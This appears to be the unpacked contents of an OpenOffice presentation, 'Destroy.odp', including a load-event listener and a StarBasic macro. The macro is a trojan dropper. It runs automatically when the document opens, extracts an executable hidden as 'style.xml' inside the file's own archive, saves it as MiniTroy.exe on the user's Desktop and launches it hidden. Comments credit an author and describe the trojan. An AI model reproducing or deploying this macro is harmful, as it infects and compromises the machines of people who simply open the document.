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style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destroy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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.destroy.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:script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</office:automatic-styles>
  <office:body>
    <office:presentation>
      <draw:page draw:name="page1" draw:style-name="dp1" draw:master-page-name="Default" presentation:presentation-page-layout-name="AL1T0"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09-04-16T11:32:32.86</meta:creation-date>
    <meta:editing-duration>PT14M57S</meta:editing-duration>
    <meta:editing-cycles>18</meta:editing-cycles>
    <meta:generator>OpenOffice.org/3.3$Win32 OpenOffice.org_project/330m20$Build-9567</meta:generator>
    <dc:date>2011-03-01T11:30:30.60</dc:date>
    <meta:document-statistic meta:object-count="23"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/destroy.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="destroy" script:language="StarBasic">' Macro VB for Extracting trojan, creating a shorcut, and spy modification 
' By Jonathan Dechaux
' 06/04/2010

' Declare the function to make a sleep 
Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

' Main Function
Sub Main
	'On Error Resume Next	' Error management
	
	' Variable definition
	Dim UserName, PathReader, ReaderEXE, DefPath As String
	
	' Path Definition
	UserName = Environ("username")							' Get the user session name
	DefPath = "C:\Users\" &amp; UserName &amp; "\Desktop\"			' Desktop path definition
    
    ' Name File definition
    ReaderEXE = "MiniTroy.exe"
    
    ' Combinaison of Path and Name file
	PathReader = DefPath &amp; ReaderEXE
	
	' Create the horse
	CreateHorse(DefPath, PathReader)

End Sub

' Function to create the horse
Function CreateHorse(DefPath As String, PathReader As String)
	'On Error Resume Next	' Error management
	
	' Variable definition
	Dim oApp As Object
	Dim FileName, FileTemp, FnameZip As Variant
	Dim PathFile, PathTemp, PathZip As String
	Dim ZipStyleXML, StyleXML, PathStyle As String
	
	' Name File definition
	FileName = "Destroy.odp"
    FileTemp = "temp.odt"
    FnameZip = "temp.zip"
    StyleXML = "style.xml"
    ZipStyleXML = "Configurations2\accelerator\" &amp; StyleXML
	
	' Combinaison of Path and Name file
	PathFile = DefPath &amp; FileName
	PathTemp = DefPath &amp; FileTemp
	PathZip = DefPath &amp; FnameZip
	PathStyle = DefPath &amp; StyleXML
	
	' If the file rapport.odt exists
	If FileExists(PathFile) Then
		Filecopy (PathFile, PathTemp)							' Copy rapport.odt in temp.odt
		Name PathTemp As PathZip								' Rename temp.odt in temp.zip
	End If
	
	' If the file temp.zip exists
	If FileExists(PathZip) Then
        If FileExists(PathReader) Then
        	' Nothing
        Else
        	Set oApp = CreateObject("Shell.Application")			' Create a Shell Application object
        	oApp.Namespace(DefPath).CopyHere oApp.Namespace(PathZip).items.Item(ZipStyleXML)	'Extract style.xml
        	Name PathStyle As PathReader							' Rename style.xml in AcroRD32.exe
        End If
    
        Kill PathZip					' Delete the ZIP file
    End If
	
	' If AcroRD32.exe exists
	If FileExists(PathReader) Then
		Shell (PathReader, vbHide)		' Launch Reader
	End If
End Function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destro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